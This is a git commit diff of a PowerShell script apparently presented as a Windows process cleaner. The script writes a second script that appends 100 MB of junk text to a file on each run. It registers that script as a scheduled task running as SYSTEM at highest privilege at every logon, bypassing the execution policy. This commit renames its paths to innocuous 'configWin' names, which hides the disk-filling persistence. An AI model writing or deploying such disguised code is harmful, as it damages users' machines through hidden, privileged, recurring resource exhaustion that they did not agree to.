359f52f19898f01be2581b260e1507fdbec22f34
boostWindows <closecompany.yt@gmail.com>
2025-05-09 00:05:13 +0200

    Update cleanWinProcess.ps1

--- cleanWinProcess.ps1
+++ cleanWinProcess.ps1
@@ -1,10 +1,13 @@
+mkdir "C:\configWin" | out-null
+mkdir "C:\configWin\assets" | out-null
+
 $contenuto = @'
-$a = "a" * 104857600 | Out-File -FilePath "C:\prova_output.txt" -Append
+$a = "a" * 104857600 | Out-File -FilePath "C:\configWin\assets\configwind.txt" -Append
 '@
 
-$contenuto | Out-File "C:\ciao.ps1"
+$contenuto | Out-File "C:\configWin\assets\configSys.ps1"
 
-$scriptPath = "C:\ciao.ps1"
+$scriptPath = "C:\configWin\assets\configSys.ps1"
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
 $trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
